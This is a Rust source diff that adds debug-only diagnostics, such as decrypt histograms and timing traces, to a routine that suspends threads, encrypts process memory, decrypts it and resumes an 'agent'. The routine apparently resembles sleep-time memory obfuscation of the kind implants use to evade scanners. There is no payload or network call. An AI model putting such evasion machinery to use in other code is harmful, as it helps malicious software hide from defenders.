@@ -1125,6 +1125,21 @@ fn thread_set_unchanged(self_tid: u32, slots: &[ThreadSlot]) -> bool {
 /// Decrypt until fully complete. Retries with backoff; if it still fails the
 /// process terminates with `ExitProcess(1)` so encrypted memory is never exposed
 /// as plaintext and no suspended thread is resumed into corrupted state.
+#[cfg(any(test, feature = "print_debug"))]
+fn ensure_decrypted(guard: &mut MemGuard, diag: &mut crate::memguard::engine::DecryptDiag) {
+    for attempt in 0..DECRYPT_MAX_ATTEMPTS {
+        trace_line("decrypt-attempt", format_args!("attempt={attempt}"));
+        if guard.decrypt_with_diag(diag) {
+            return;
+        }
+        sleep_backoff(attempt);
+    }
+    // Final attempt; if pages remain encrypted, die rather than resume corrupted.
+    if guard.encrypted_count() != 0 {
+        unsafe { ExitProcess(1) };
+    }
+}
+#[cfg(not(any(test, feature = "print_debug")))]
 fn ensure_decrypted(guard: &mut MemGuard) {
     for attempt in 0..DECRYPT_MAX_ATTEMPTS {
         trace_line("decrypt-attempt", format_args!("attempt={attempt}"));
@@ -1138,7 +1153,6 @@ fn ensure_decrypted(guard: &mut MemGuard) {
         unsafe { ExitProcess(1) };
     }
 }
-
 fn run_cycle(
     guard: &mut MemGuard,
     ntqit: NtQueryInformationThreadFn,
@@ -1257,8 +1271,17 @@ fn run_cycle(
     let enc_elapsed = trace_now() - t0_enc;
     if !encrypt_ok {
         emit_skip("encrypt failed");
-        ensure_decrypted(guard);
-        set_stdout_safe(true);
+        #[cfg(any(test, feature = "print_debug"))]
+        {
+            let mut diag = crate::memguard::engine::DecryptDiag::default();
+            ensure_decrypted(guard, &mut diag);
+            set_stdout_safe(true);
+        }
+        #[cfg(not(any(test, feature = "print_debug")))]
+        {
+            ensure_decrypted(guard);
+            set_stdout_safe(true);
+        }
         trace_line(
             "cycle-return",
             format_args!("skipped=true reason=encrypt-failed"),
@@ -1319,6 +1342,15 @@ fn run_cycle(
     let partial = knobs.partial;
 
     let t0_dec = trace_now();
+    #[cfg(any(test, feature = "print_debug"))]
+    {
+        let (enc0, busy0, plain0) = guard.decrypt_histogram();
+        trace_line(
+            "decrypt-start",
+            format_args!("enc={enc0} busy={busy0} plain={plain0} partial={partial:?}"),
+        );
+    }
+    #[cfg(not(any(test, feature = "print_debug")))]
     trace_line("decrypt-start", format_args!("partial={:?}", partial));
     match partial {
         Some(k) => {
@@ -1330,13 +1362,34 @@ fn run_cycle(
         None => {
             // Decrypt must fully succeed before any thread is resumed or the agent
             // woken. A failed decrypt terminates the process.
-            ensure_decrypted(guard);
-            set_stdout_safe(true);
+            #[cfg(any(test, feature = "print_debug"))]
+            {
+                let mut diag = crate::memguard::engine::DecryptDiag::default();
+                ensure_decrypted(guard, &mut diag);
+                set_stdout_safe(true);
+                trace_line(
+                    "decrypt-done",
+                    format_args!(
+                        "elapsed_ms={} enc={} busy={} plain={} xored={}",
+                        trace_now() - t0_dec,
+                        diag.enc,
+                        diag.busy,
+                        diag.plain,
+                        diag.xored
+                    ),
+                );
+            }
+            #[cfg(not(any(test, feature = "print_debug")))]
+            {
+                ensure_decrypted(guard);
+                set_stdout_safe(true);
+                trace_line(
+                    "decrypt-done",
+                    format_args!("elapsed_ms={}", trace_now() - t0_dec),
+                );
+            }
         }
     }
-
-    let dec_elapsed = trace_now() - t0_dec;
-    trace_line("decrypt-done", format_args!("elapsed_ms={dec_elapsed}"));
 
     let resumed = slots.slots[..n].iter().filter(|s| s.suspended).count();
     emit_wake(pages, resumed);
